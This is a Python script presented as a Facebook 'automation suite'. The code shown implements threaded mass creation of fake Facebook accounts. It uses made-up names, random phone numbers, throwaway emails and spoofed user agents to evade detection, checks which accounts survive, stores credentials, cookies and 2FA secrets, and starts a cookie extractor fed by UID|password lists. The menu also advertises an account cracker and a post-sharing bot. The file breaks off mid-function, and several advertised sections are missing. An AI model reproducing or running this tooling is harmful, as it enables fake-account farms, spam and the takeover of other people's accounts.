#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════════════╗
# ║            P R E M   T O O L S   v 4 . 0                        ║
# ║        Premium Facebook Automation Suite                         ║
# ║        All-in-One · Fast · Full Output · Aesthetic UI            ║
# ╚══════════════════════════════════════════════════════════════════╝
#  [A] Auto Create FB   (Methods 1/2/3 – FAST threaded)
#  [B] 2FA Manager
#  [C] Utilities        (UID / PW / Token / Cookie / Net / File)
#  [D] Cookies Extractor
#  [E] TempMail OTP     (Mail.tm  +  1secmail fallback)
#  [F] Create FB via TempMail + OTP  (fully working)
#  [G] FB Cracker       (Old Clone – full output)
#  [H] Share Tool       (Cookie-based post sharer)
#  [0] Exit

# ==================================================================
# SECTION 1 – IMPORTS
# ==================================================================
import os, sys, re, time, json, uuid, random, string, logging
import platform, socket, threading, hashlib
from datetime import datetime
from time import sleep
from typing import List, Dict, Set, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup

try:
    from fake_useragent import UserAgent as _FUA
    _ua_lib = _FUA(); _use_fua = True
except Exception:
    _use_fua = False

try:
    from faker import Faker
    _faker = Faker(); _has_faker = True
except Exception:
    _has_faker = False

try:
    import pyotp; _has_pyotp = True
except Exception:
    _has_pyotp = False

try:
    import urllib3; urllib3.disable_warnings()
except Exception:
    pass

rr = random.randint
ri = random.randint

# ==================================================================
# SECTION 2 – COLOR PALETTE  (no pink – indigo / cyan / neon theme)
# ==================================================================
W   = '\033[97m'          # Bright white
G   = '\033[38;5;82m'     # Neon green
R   = '\033[38;5;196m'    # Vivid red   (errors only)
C   = '\033[38;5;51m'     # Bright cyan
Y   = '\033[38;5;220m'    # Gold
M   = '\033[38;5;69m'     # Cornflower blue  (was purple/pink – now blue)
O   = '\033[38;5;208m'    # Orange
D   = '\033[90m'          # Dim grey
V   = '\033[38;5;39m'     # Electric blue

_H  = '\033[38;5;57m'     # Deep indigo   (borders)
_A  = '\033[38;5;45m'     # Aqua          (prompts / active)
_X  = '\033[38;5;240m'    # Mid grey      (pipes)
_LG = '\033[38;5;46m'     # Lime green    (success)
_B  = '\033[38;5;27m'     # Royal blue    (accent)

BOLD  = '\033[1m'
DIM   = '\033[2m'
RESET = '\033[0m'

# ==================================================================
# SECTION 3 – CONFIGURATION
# ==================================================================
logging.basicConfig(level=logging.ERROR, filename='prem.log',
                    format='%(asctime)s %(levelname)s %(message)s')

_is_android = os.path.exists('/sdcard')
_BASE = '/sdcard/PREMTOOLS' if _is_android else os.path.expanduser('~/PREMTOOLS')

CFG = {
    'base'          : _BASE,
    'two_fa_dir'    : os.path.join(_BASE, '2FA'),
    'results_dir'   : os.path.join(_BASE, 'RESULTS'),
    # result files
    'f_create'      : 'Auto_Create.txt',
    'f_crack_m1'    : 'Crack_M1_OK.txt',
    'f_crack_m2'    : 'Crack_M2_OK.txt',
    'f_coki_ok'     : 'Cookies_OK.txt',
    'f_coki_cp'     : 'Cookies_CP.txt',
    'f_tmpmail'     : 'TempMail_Accounts.txt',
    'f_share_tok'   : 'share_tokens.json',
    'f_share_cok'   : 'share_cookies.json',
    'f_pwlist'      : 'PasswordList.txt',
    'f_uid_checked' : 'UID_Checked.txt',
    'f_tok_valid'   : 'Tokens_Valid.txt',
    'f_proxy_ok'    : 'Proxies_Working.txt',
    # API
    'ip_api'        : 'https://api.ipify.org?format=json',
    'ip_detail'     : 'https://ipapi.co/json/',
    'proxy_url'     : 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all',
    'fb_reg'        : 'https://x.facebook.com/reg',
    'fb_submit'     : 'https://www.facebook.com/reg/submit/',
    'fb_confirm'    : 'https://www.facebook.com/confirmemail.php',
    # runtime
    'create_workers': 15,
    'crack_workers' : 30,
    'share_workers' : 3,
    'share_cap'     : 60,
    'share_cd'      : 10,
    'timeout'       : 15,
}

for _d in [CFG['base'], CFG['two_fa_dir'], CFG['results_dir']]:
    os.makedirs(_d, exist_ok=True)

# ==================================================================
# SECTION 4 – USER-AGENT POOL
# ==================================================================
_ua_pool: List[str] = []

def _build_pool():
    global _ua_pool
    rc = random.choice; ri = random.randint
    oppo = ['CPH2461','CPH2451','CPH2321','CPH2341','CPH2371','CPH2389','CPH2401']
    sam  = ['SM-A515F','SM-A525F','SM-G998B','SM-A135F','SM-A235F','SM-A536B','SM-A726B','SM-M526B','SM-A037F']
    red  = ['2211133G','M2004J19C','22041219I','Redmi Note 9','Redmi Note 10 Pro','Redmi 9C','22101316UG']
    rea  = ['RMX3516','RMX3371','RMX3461','RMX3286','RMX3561','RMX3142','RMX1805']
    vivo = ['V2120','V2109','V2111','V2040','V2025','V2030','V2145']
    inf  = ['Infinix X669C','Infinix X6823','Infinix X676C','Infinix X689C']
    tec  = ['TECNO KG5j','TECNO KG7h','TECNO LC6','TECNO LD7','TECNO LH8']
    btags = ['TKQ1','SKQ1','TP1A','RKQ1','SP1A','RP1A','UP1A']
    bsuf  = ['001','002','011','012','014','021','030']
    for _ in range(400):
        av = ri(9,14); cv = ri(90,118)
        bt = rc(btags); bs = rc(bsuf)
        bld = f"{bt}.{ri(120000,250000)}.{bs}"
        for dev in [rc(oppo), rc(sam), rc(red), rc(rea), rc(vivo), rc(inf), rc(tec)]:
            _ua_pool.append(
                f"Mozilla/5.0 (Linux; Android {av}; {dev} Build/{bld}; wv) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
                f"Chrome/{cv}.0.{ri(4200,5700)}.{ri(60,160)} Mobile Safari/537.36"
            )
    for _ in range(60):
        fv = ri(100,121); av = ri(10,14)
        _ua_pool.append(f"Mozilla/5.0 (Android {av}; Mobile; rv:{fv}.0) Gecko/{fv}.0 Firefox/{fv}.0")

_build_pool()

def uagen() -> str:
    if _use_fua:
        try: return str(_ua_lib.random)
        except: pass
    return random.choice(_ua_pool) if _ua_pool else \
        "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"

def ua_win() -> str:
    bld = ri(6000,9000); ptch = ri(100,200)
    nt  = random.choice(['10.0','11.0'])
    return f"Mozilla/5.0 (Windows NT {nt}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{bld}.{ptch} Safari/537.36"

_share_uas = [
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.11.118;]",
    "Mozilla/5.0 (Linux; Android 13; Google Pixel 6a Build/TQ3A.230605.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/340.0.0.15.119;]",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.12.120;]",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QD1A.190821.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/337.0.0.13.121;]",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/341.0.0.16.122;]",
    "Mozilla/5.0 (Linux; Android 9; SM-G973F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.10.117;]",
]

# ==================================================================
# SECTION 5 – UTILITY / UI HELPERS
# ==================================================================
def clr():
    os.system('cls' if platform.system().lower() == 'windows' else 'clear')

def save(data: str, fname: str):
    path = os.path.join(CFG['base'], fname)
    with open(path, 'a', encoding='utf-8') as f: f.write(data + '\n')

def get_ip() -> str:
    try: return requests.get(CFG['ip_api'], timeout=5).json().get('ip','Unknown')
    except: return 'Unknown'

def get_ip_detail() -> dict:
    try: return requests.get(CFG['ip_detail'], timeout=8).json()
    except: return {}

def now_str() -> str:
    return datetime.now().strftime('%Y-%m-%d  %H:%M:%S')

def linex():
    print(f"{_H}  {'─'*54}{RESET}")

def linex_bold():
    print(f"{_H}  {'═'*54}{RESET}")

def prompt(label: str) -> str:
    return input(f"{_H}  [{_A}›{_H}] {W}{label}{_X}:{W} ")

def press_enter(fn=None):
    input(f"{_H}  [{_A}›{_H}] {D}Press Enter to continue…{RESET} ")
    if fn: fn()

def bad():
    print(f"{R}  ✗  Invalid choice{RESET}"); sleep(0.7)

def extractor(html: str) -> dict:
    soup = BeautifulSoup(html, 'html.parser')
    return {i.get('name'): i.get('value','') for i in soup.find_all('input') if i.get('name')}

# ==================================================================
# SECTION 6 – BANNER
# ==================================================================
def banner():
    clr()
    ip   = get_ip()
    date = now_str()
    print(f"""{_H}
  ╔══════════════════════════════════════════════════════╗
  ║{_B}{BOLD}                                                      {RESET}{_H}║
  ║{_B}{BOLD}  ██████╗ ██████╗ ███████╗███╗   ███╗               {RESET}{_H}║
  ║{_B}{BOLD}  ██╔══██╗██╔══██╗██╔════╝████╗ ████║               {RESET}{_H}║
  ║{_B}{BOLD}  ██████╔╝██████╔╝█████╗  ██╔████╔██║               {RESET}{_H}║
  ║{_B}{BOLD}  ██╔═══╝ ██╔══██╗██╔══╝  ██║╚██╔╝██║               {RESET}{_H}║
  ║{_B}{BOLD}  ██║     ██║  ██║███████╗██║ ╚═╝ ██║               {RESET}{_H}║
  ║{_B}{BOLD}  ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝               {RESET}{_H}║
  ║{C}{BOLD}      ████████╗ ██████╗  ██████╗ ██╗     ███████╗   {RESET}{_H}║
  ║{C}{BOLD}         ██║   ██╔═══██╗██╔═══██╗██║     ██╔════╝   {RESET}{_H}║
  ║{C}{BOLD}         ██║   ██║   ██║██║   ██║██║     ███████╗   {RESET}{_H}║
  ║{C}{BOLD}         ██║   ██║   ██║██║   ██║██║     ╚════██║   {RESET}{_H}║
  ║{C}{BOLD}         ██║   ╚██████╔╝╚██████╔╝███████╗███████║   {RESET}{_H}║
  ║{C}{BOLD}         ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝      {RESET}{_H}
  ║{C}{BOLD}         ███╗   ██╗██╗██╗  ██╗ █████╗  █████╗             {RESET}{_H}║
  ║{C}{BOLD}         ████╗  ██║██║██║ ██╔╝██╔══██╗██╔══██╗            {RESET}{_H}║
  ║{C}{BOLD}         ██╔██╗ ██║██║█████╔╝ ███████║███████║          {RESET}{_H}║  
  ║{C}{BOLD}         ██║╚██╗██║██║██╔═██╗ ██╔══██║██╔══██║         {RESET}{_H}║   
  ║{C}{BOLD}         ██║ ╚████║██║██║  ██╗██║  ██║██║  ██║         {RESET}{_H}║   
  ║{C}{BOLD}         ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝      {RESET}{_H}║
  ║
  ╠══════════════════════════════════════════════════════╣
  ║  {Y}▸ VERSION  {_X}│{W}  v4.0 PREMIUM · FAST · ALL-IN-ONE     {_H}║
  ║  {G}▸ IP ADDR  {_X}│{W}  {ip:<38}{_H}║ 
  ║  {C}▸ DATE     {_X}│{W}  {date:<38}{_H}║
  ║  {_A}▸ STATUS   {_X}│{G}  ● ONLINE  ● ACTIVE ● NIKA  ● BREVOUR                  {_H}║
  ╚══════════════════════════════════════════════════════╝{RESET}""")

def sec_hdr(title: str, col=_A):
    inner = f"  ◈  {title}  ◈"
    pad   = max(54 - len(inner), 0)
    print(f"\n{_H}  ╔══════════════════════════════════════════════════════╗")
    print(f"{_H}  ║{col}{BOLD}{inner}{' '*pad}{RESET}{_H}║")
    print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")

# ==================================================================
# SECTION 7 – NAME / PHONE / PASSWORD GENERATORS
# ==================================================================
_FN = [
    "Maria","Ana","Joy","Grace","Angel","Angela","Christine","Michelle","Sheila",
    "Maricel","Marites","Maribel","Jennifer","Jenny","Jessa","Jessica","Katherine",
    "Catherine","Karen","Karla","Camille","Bianca","Patricia","Aileen","Irene",
    "Cherry","Lovely","Honey","Princess","Angelica","Rowena","Rosalie","Roselyn",
    "Liza","Elizabeth","Isabel","Andrea","Alexandra","Alexa","Nina","Mina","Rina",
    "Jocelyn","Joan","Joyce","Judy","Julie","Juliana","Faith","Hope","Charity",
    "Blessy","Precious","Shaira","Aira","Kyra","Rachel","Selena","Wendy","Clara",
    "Hannah","Helen","Laura","Linda","Lisa","Mabel","Marie","Marilyn","Martha",
    "Nadia","Nancy","Natalie","Nicole","Nora","Olivia","Pearl","Rebecca","Rita",
    "Rosa","Rose","Ruby","Ruth","Sarah","Sophia","Stephanie","Tiffany","Vanessa",
    "Victoria","Vivian","Yolanda","Zara","Abigail","Adriana","Celine","Diana",
    "Juan","Jose","Pedro","Paolo","Paul","Mark","John","Jonathan","Nathan","Michael",
    "Miguel","Daniel","David","Andrew","Anthony","Antonio","Albert","Brian","Bryan",
    "Benjamin","Carlo","Carlos","Christian","Christopher","Dennis","Diego","Dominic",
    "Edward","Emmanuel","Eric","Francis","Frank","Gabriel","Gilbert","Henry","Ian",
    "Ivan","James","Jasper","Jerome","Joel","Kenneth","Kevin","Kyle","Lawrence",
    "Leo","Leonard","Marco","Martin","Matthew","Melvin","Nathaniel","Noel","Oliver",
    "Patrick","Raymond","Richard","Robert","Ronald","Ryan","Samuel","Steven","Thomas",
    "Timothy","Victor","Vincent","William","Xavier","Zachary","Aaron","Adrian","Alex",
    "Alexander","Alfredo","Alvin","Angelo","Ariel","Austin","Brandon","Chester",
    "Clifford","Cole","Daniel","Darwin","Dean","Dexter","Dylan","Efren","Elias",
    "Ethan","Eugene","Fabian","Felix","Fernando","Floyd","Gerald","Gino","Glen",
    "Greg","Harold","Harvey","Hector","Hugo","Isaac","Jake","Jason","Jay","Jeffrey",
    "Jeremy","Jerry","Jesse","Jim","Joey","Jordan","Josh","Joshua","Justin","Karl",
]
_SN = [
    "Santos","Reyes","Cruz","Bautista","Garcia","Mendoza","Flores","Gonzales","Ramos",
    "Aquino","Villanueva","Fernandez","Castillo","Torres","Dominguez","Navarro",
    "Salazar","DeGuzman","Perez","Rivera","Lopez","Martinez","Hernandez","Alvarez",
    "Morales","Rojas","Santiago","Padilla","Rosales","Valdez","Estrada","Aguilar",
    "Manalo","Francisco","Romero","Velasco","Soriano","Pascual","Pineda","Ferrer",
    "Cuevas","Suarez","Calderon","Lim","Tan","Chua","Go","Sy","Uy","Chan","Wong",
    "Alegre","Almonte","Alvarado","Araneta","Arceo","Arenas","Arroyo","Asuncion",
    "Bacani","Balagtas","Baluyot","Banzon","Barretto","Bello","Benitez","Bondoc",
    "Borromeo","Buenaventura","Bustamante","Caballes","Cabanilla","Cabral","Cabuhat",
    "Calleja","Campos","Canlas","Capulong","Carbonell","Cardenas","Cayetano",
    "Cervantes","Clemente","Cobankiat","Constantino","Contreras","Coronel","Corpus",
    "Cunanan","De Jesus","De Leon","Diaz","Dizon","Duran","Ejercito","Escudero",
    "Esguerra","Espino","Espiritu","Evangelista","Fabella","Fajardo","Feria",
    "Fermin","Figueroa","Fontanilla","Galang","Gatchalian","Gomez","Gonzaga",
    "Guevara","Guerrero","Gutierrez","Guzman","Hidalgo","Ilagan","Imperial",
    "Javier","Jimenez","Lacson","Lagman","Lapid","Lazaro","Legarda","Luna",
    "Medina","Mercado","Miranda","Morato","Narciso","Nieto","Ocampo","Oliveros",
]

def rand_name():
    return random.choice(_FN), random.choice(_SN)

def rand_pass() -> str:
    n = ''.join(random.choices(string.ascii_letters, k=ri(5,8))).capitalize()
    s = ''.join(random.choices('!@#$%^&*_+=', k=ri(1,2)))
    d = ''.join(random.choices(string.digits, k=ri(2,4)))
    e = ''.join(random.choices(string.ascii_lowercase, k=ri(2,4)))
    u = ''.join(random.choices(string.ascii_uppercase, k=ri(1,2)))
    parts = [n, s, d, e, u]; random.shuffle(parts)
    pw = ''.join(parts)
    return pw if len(pw) >= 8 else pw + str(ri(100,999))

def bd_phone() -> str:
    return f"+88{random.choice(['017','019','018','016','015'])}{''.join(random.choices(string.digits,k=8))}"

def mix_phone() -> str:
    c = random.choice([
        ('+92', ['300','301','302','303']), ('+63', ['917','918','919']),
        ('+62', ['813','815','817']),       ('+91', ['98','99','97']),
        ('+234',[' 701','703','704']),      ('+66', ['081','082','083']),
        ('+84', ['090','091','092']),       ('+977',['97','98']),
    ])
    return f"{c[0]}{random.choice(c[1])}{''.join(random.choices(string.digits,k=7))}"

def tmp_email() -> str:
    nm = ''.join(random.choices(string.ascii_lowercase, k=ri(6,10)))
    return f"{nm}{ri(100,9999)}@xiyadmailx.xyz"

def reg_headers() -> dict:
    return {
        'User-Agent': uagen(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
    }

def build_payload(fn, ln, contact, pw, form, sex='1', yr=(1987,1999)) -> dict:
    return {
        'ccp':'2', 'ns':'1',
        'reg_instance':      form.get('reg_instance',''),
        'submission_request':'true',
        'reg_impression_id': form.get('reg_impression_id',''),
        'logger_id':         form.get('logger_id',''),
        'firstname': fn, 'lastname': ln,
        'birthday_day':   str(ri(10,25)),
        'birthday_month': str(ri(1,12)),
        'birthday_year':  str(ri(*yr)),
        'reg_email__': contact,
        'sex': sex,
        'encpass': f'#PWD_BROWSER:0:{int(time.time())}:{pw}',
        'submit': 'Sign Up',
        'fb_dtsg':  form.get('fb_dtsg',''),
        'jazoest':  form.get('jazoest',''),
        'lsd':      form.get('lsd',''),
    }

def check_pic(uid: str) -> str:
    try:
        r = requests.get(f"https://graph.facebook.com/{uid}/picture?type=normal",
                         headers={'User-Agent': uagen()}, allow_redirects=False, timeout=8)
        if r.status_code == 302:
            return 'live' if 'scontent' in r.headers.get('Location','') else 'not_live'
    except: pass
    return 'unknown'

# ==================================================================
# SECTION 8 – FAST AUTO CREATE  (threaded, 15 workers)
# ==================================================================
_oks: List[str] = []; _cps: List[str] = []
_lock = threading.Lock()

def _print_ok(fn, ln, contact, uid, pw, coki=''):
    with _lock:
        linex()
        print(f"{_H}  ┌─[ {G}NEW ACCOUNT {_H}]{'─'*40}┐")
        print(f"{W}  {_X}│  {Y}Name     {_X}│  {G}{fn} {ln}")
        print(f"{W}  {_X}│  {Y}Contact  {_X}│  {C}{contact}")
        print(f"{W}  {_X}│  {Y}UID      {_X}│  {G}{BOLD}{uid}{RESET}")
        print(f"{W}  {_X}│  {Y}Password {_X}│  {O}{pw}")
        if coki:
            for i, ch in enumerate([coki[j:j+58] for j in range(0,min(len(coki),290),58)]):
                lbl = 'Cookies' if i==0 else '       '
                print(f"{W}  {_X}│  {Y}{lbl}  {_X}│  {_A}{ch}")
        print(f"{W}  {_X}│  {Y}Date     {_X}│  {D}{now_str()}")
        print(f"{_H}  └{'─'*52}┘{RESET}")

def _create_one(contact_type: str, pw: str, show: bool, extra_hdr: dict = None):
    """Single account creation attempt – designed to run in a thread."""
    try:
        ses = requests.Session()
        ses.headers.update(reg_headers())
        r   = ses.get(CFG['fb_reg'], timeout=CFG['timeout'])
        frm = extractor(r.text)
        fn, ln = rand_name()
        if contact_type == '1':
            contact = bd_phone()
        elif contact_type == '2':
            contact = mix_phone()
        else:
            contact = tmp_email()
        pl = build_payload(fn, ln, contact, pw, frm)
        hdrs = reg_headers()
        if extra_hdr:
            hdrs.update(extra_hdr)
        ses.post(CFG['fb_submit'], data=pl, headers=hdrs, timeout=CFG['timeout'])
        cki = ses.cookies.get_dict()
        if 'c_user' in cki:
            uid  = cki['c_user']
            cstr = ';'.join(f"{k}={v}" for k,v in cki.items())
            with _lock:
                _oks.append(uid)
            save(f"{uid}|{pw}", CFG['f_create'])
            if show:
                _print_ok(fn, ln, contact, uid, pw, cstr)
            else:
                sys.stdout.write(f"\r{G}  [OK] {uid} | {pw}{RESET}          ")
                sys.stdout.flush()
        elif any(k in cki for k in ('checkpoint', 'x-referer')):
            with _lock: _cps.append(cki.get('c_user','?'))
        sys.stdout.write(f"\r{_H}  PREM  {G}OK:{len(_oks)}  {R}CP:{len(_cps)}{W}     ")
        sys.stdout.flush()
    except Exception:
        pass

def _run_create(method: int, num: int, contact_type: str, pw: str, show: bool):
    banner()
    sec_hdr(f"A U T O   C R E A T E  ·  M E T H O D   {method}", G)
    linex()
    print(f"{W}  {_X}│  {Y}Total    {_X}│  {R}{num}")
    print(f"{W}  {_X}│  {Y}Password {_X}│  {O}{pw}")
    print(f"{W}  {_X}│  {Y}Threads  {_X}│  {C}{CFG['create_workers']}")
    print(f"{W}  {_X}│  {Y}Date     {_X}│  {D}{now_str()}")
    linex()
    extra = {}
    if method == 2:
        extra = {'Referer':'https://mbasic.facebook.com/reg/', 'sec-ch-ua-mobile':'?1'}
    with ThreadPoolExecutor(max_workers=CFG['create_workers']) as pool:
        futs = []
        for _ in range(num):
            futs.append(pool.submit(_create_one, contact_type, pw, show, extra if method==2 else None))
        for f in as_completed(futs): f.result()
    print(); linex()
    print(f"{W}  {G}▸{W}  DONE  │  {G}OK:{len(_oks)}  {_X}│  {R}CP:{len(_cps)}{RESET}")
    linex()
    press_enter(main_menu)

def _ask_create_params():
    linex()
    print(f"  {_A}[1]{W}  BD Phone   {_A}[2]{W}  Mixed Phone   {_A}[3]{W}  TempMail")
    linex()
    ct = prompt("CONTACT TYPE (1/2/3)").strip()
    linex()
    try:
        num = int(prompt("HOW MANY ACCOUNTS").strip())
        if num <= 0: raise ValueError
    except ValueError:
        print(f"{R}  ✗  Enter a valid number{RESET}"); return None
    linex()
    print(f"  {_A}[1]{W}  Auto Password   {_A}[2]{W}  Custom Password")
    linex()
    pch = prompt("PASSWORD (1/2)").strip()
    pw  = rand_pass() if pch == '1' else prompt("ENTER PASSWORD").strip()
    if not pw: print(f"{R}  ✗  Empty password{RESET}"); return None
    linex()
    show = prompt("Show full details? (y/n)").strip().lower() == 'y'
    return ct, num, pw, show

def createfb_m1():
    banner(); sec_hdr("A U T O   C R E A T E  ·  M E T H O D   1", G)
    r = _ask_create_params()
    if r: _run_create(1, r[1], r[0], r[2], r[3])

def createfb_m2():
    banner(); sec_hdr("A U T O   C R E A T E  ·  M E T H O D   2", G)
    r = _ask_create_params()
    if r: _run_create(2, r[1], r[0], r[2], r[3])

def createfb_m3():
    """Method 3: creates account then verifies profile pic is live."""
    global _oks, _cps
    banner(); sec_hdr("A U T O   C R E A T E  ·  M E T H O D   3", G)
    r = _ask_create_params()
    if not r: return
    ct, num, pw, show = r
    banner(); sec_hdr("A U T O   C R E A T E  ·  M E T H O D   3", G)
    linex()
    print(f"{W}  {_X}│  {Y}Total  {_X}│  {R}{num}")
    print(f"{W}  {_X}│  {Y}Pass   {_X}│  {O}{pw}   {D}(pic-verify enabled)")
    linex()

    def _m3_one(contact_type, pw, show):
        try:
            ses = requests.Session()
            ses.headers.update(reg_headers())
            resp = ses.get(CFG['fb_reg'], timeout=CFG['timeout'])
            frm  = extractor(resp.text)
            fn, ln = rand_name()
            contact = bd_phone() if contact_type=='1' else mix_phone() if contact_type=='2' else tmp_email()
            pl = build_payload(fn, ln, contact, pw, frm)
            ses.post(CFG['fb_submit'], data=pl, headers=reg_headers(), timeout=CFG['timeout'])
            cki = ses.cookies.get_dict()
            if 'c_user' in cki:
                uid    = cki['c_user']
                status = check_pic(uid)
                cstr   = ';'.join(f"{k}={v}" for k,v in cki.items())
                if status == 'live':
                    with _lock: _oks.append(uid)
                    save(f"{uid}|{pw}|{cstr}", CFG['f_create'])
                    if show: _print_ok(fn, ln, contact, uid, pw, cstr)
                    else:
                        sys.stdout.write(f"\r{G}  [OK-LIVE] {uid} | {pw}{RESET}   ")
                        sys.stdout.flush()
                else:
                    with _lock: _cps.append(uid)
            sys.stdout.write(f"\r{_H}  PREM  {G}OK:{len(_oks)}  {R}CP:{len(_cps)}{W}     ")
            sys.stdout.flush()
        except: pass

    with ThreadPoolExecutor(max_workers=CFG['create_workers']) as pool:
        futs = [pool.submit(_m3_one, ct, pw, show) for _ in range(num)]
        for f in as_completed(futs): f.result()
    print(); linex()
    print(f"{W}  {G}▸{W}  DONE  │  {G}OK:{len(_oks)}  {_X}│  {R}CP:{len(_cps)}{RESET}")
    linex()
    press_enter(main_menu)

def auto_create_menu():
    while True:
        banner()
        print(f"{_H}  ╔══════════════════════════════════════════════════════╗")
        print(f"{_H}  ║{G}{BOLD}      ◈  A U T O   C R E A T E   F B  ◈          {RESET}{_H}  ║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {_A}[1]{W}  Method 1  · Fast Threaded (15 workers)        {_H}║")
        print(f"{_H}  ║  {_A}[2]{W}  Method 2  · Enhanced Headers                  {_H}║")
        print(f"{_H}  ║  {_A}[3]{W}  Method 3  · Pic-Verified (live check)         {_H}║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {R}[0]{W}  Back                                           {_H}║")
        print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")
        linex()
        ch = prompt("SELECT").strip()
        if   ch == '1': createfb_m1()
        elif ch == '2': createfb_m2()
        elif ch == '3': createfb_m3()
        elif ch == '0': main_menu()
        else: bad()

# ==================================================================
# SECTION 9 – 2FA MANAGER
# ==================================================================
def _2fa_dir() -> str:
    d = CFG['two_fa_dir']; os.makedirs(d, exist_ok=True); return d

def get_default_pw() -> Optional[str]:
    fp = os.path.join(_2fa_dir(), 'default_password.txt')
    return open(fp).read().strip() if os.path.exists(fp) else None

def set_default_pw():
    banner(); sec_hdr("S E T   D E F A U L T   P A S S W O R D", M)
    linex()
    if get_default_pw():
        print(f"{Y}  ▸  Password already saved.")
        if prompt("Change it? (y/n)").strip().lower() != 'y':
            press_enter(two_fa_menu); return
    pw = prompt("New default password").strip()
    if not pw: print(f"{R}  ✗  Empty!{RESET}"); press_enter(two_fa_menu); return
    with open(os.path.join(_2fa_dir(),'default_password.txt'),'w') as f: f.write(pw)
    print(f"{G}  ✓  Saved!{RESET}"); press_enter(two_fa_menu)

def just_2fa():
    if not _has_pyotp:
        print(f"{R}  ✗  Install pyotp: pip install pyotp{RESET}"); press_enter(two_fa_menu); return
    banner(); sec_hdr("2 F A   G E N E R A T O R", M); linex()
    sk = prompt("2FA Secret Key").strip().replace(' ','')
    try:
        totp = pyotp.TOTP(sk)
        print(f"{W}  {M}▸{W}  Press {R}Ctrl+C{W} to stop"); linex()
        while True:
            code = totp.now(); rem = 30 - (int(time.time()) % 30)
            sys.stdout.write(f"\r{W}  {_A}▸  Code : {G}{BOLD} {code} {RESET}{W}  │  Refresh in {R}{rem:2d}s{RESET}  ")
            sys.stdout.flush(); sleep(1)
    except KeyboardInterrupt:
        print(f"\n{R}  ✗  Stopped{RESET}"); press_enter(two_fa_menu)
    except Exception as e:
        print(f"\n{R}  ✗  {e}{RESET}"); press_enter(two_fa_menu)

def save_2fa():
    if not _has_pyotp:
        print(f"{R}  ✗  Install pyotp{RESET}"); press_enter(two_fa_menu); return
    banner(); sec_hdr("2 F A   +   S A V E   U I D / P A S S / K E Y", M); linex()
    pw = get_default_pw()
    if not pw:
        print(f"{R}  ✗  No default password. Set one in option [3] first{RESET}")
        press_enter(two_fa_menu); return
    uid = prompt("UID").strip()
    sk  = prompt("2FA Secret Key").strip().replace(' ','')
    d   = _2fa_dir()
    with open(os.path.join(d,'id_auto.txt'),'a') as f: f.write(f"{uid}|{pw}|{sk}\n")
    with open(os.path.join(d,'2fa_key.txt'),'w') as f: f.write(sk)
    print(f"{G}  ✓  Saved!{RESET}")
    just_2fa()

def two_fa_menu():
    while True:
        banner()
        print(f"{_H}  ╔══════════════════════════════════════════════════════╗")
        print(f"{_H}  ║{M}{BOLD}           ◈  2 F A   M A N A G E R  ◈           {RESET}{_H}    ║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {_A}[1]{W}  Just 2FA Generator                            {_H}║")
        print(f"{_H}  ║  {_A}[2]{W}  2FA + Save UID / Pass / Key                   {_H}║")
        print(f"{_H}  ║  {_A}[3]{W}  Set Default Password                          {_H}║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {R}[0]{W}  Back                                           {_H}║")
        print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")
        linex()
        ch = prompt("SELECT").strip()
        if   ch == '1': just_2fa()
        elif ch == '2': save_2fa()
        elif ch == '3': set_default_pw()
        elif ch == '0': break
        else: bad()

# ==================================================================
# SECTION 10 – COOKIES EXTRACTOR
# ==================================================================
_ok_count = 0; _cp_count = 0; _loop_c = 0; _total_c = 0

def coki_ext():
    global _ok_count, _cp_count, _loop_c, _total_c
    banner(); sec_hdr("C O O K I E S   E X T R A C T O R", C); linex()
    fp = prompt("Enter UID|Password file path").strip()
    if not os.path.exists(fp):
        print(f"{R}  ✗  File not found{RESET}"); press_enter(main_menu); return
    with open(fp,'r') as f:
        lines = [l.strip() for l in f if l.strip()]
    _total_c = len(lines)
    if not _total_c:
        print(f"{R}  ✗  Empty file{RESET}"); press_enter(main_menu); return
